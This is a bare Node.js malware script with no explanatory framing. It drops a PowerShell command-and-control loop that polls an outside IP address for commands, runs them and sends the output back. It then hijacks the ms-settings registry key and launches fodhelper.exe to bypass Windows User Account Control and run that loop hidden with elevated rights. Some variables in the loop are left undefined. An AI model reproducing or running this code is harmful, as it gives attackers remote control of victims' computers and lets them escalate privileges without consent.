const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const c2 = 'https://203.0.113.24:443';
const powershell = [
  'while ($true) {',
  '  $cmd = Invoke-WebRequest -Uri "$base/c2/poll?s=$sid"',
  '  Invoke-Expression $cmd',
  '  Invoke-WebRequest -Uri "$base/c2/out?s=$sid&o=$result"',
  '  Start-Sleep 5',
  '}',
].join('\r\n');

const scriptPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'agent.ps1');
fs.writeFileSync(scriptPath, powershell);
const key = 'HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command';
exec('reg add "' + key + '" /ve /d "powershell -WindowStyle Hidden -File ' + scriptPath + '" /f');
exec('reg add "' + key + '" /v DelegateExecute /t REG_SZ /d "" /f');
function runCmd(command) { exec(command); }
runCmd('start "" "C:\\Windows\\System32\\fodhelper.exe"');
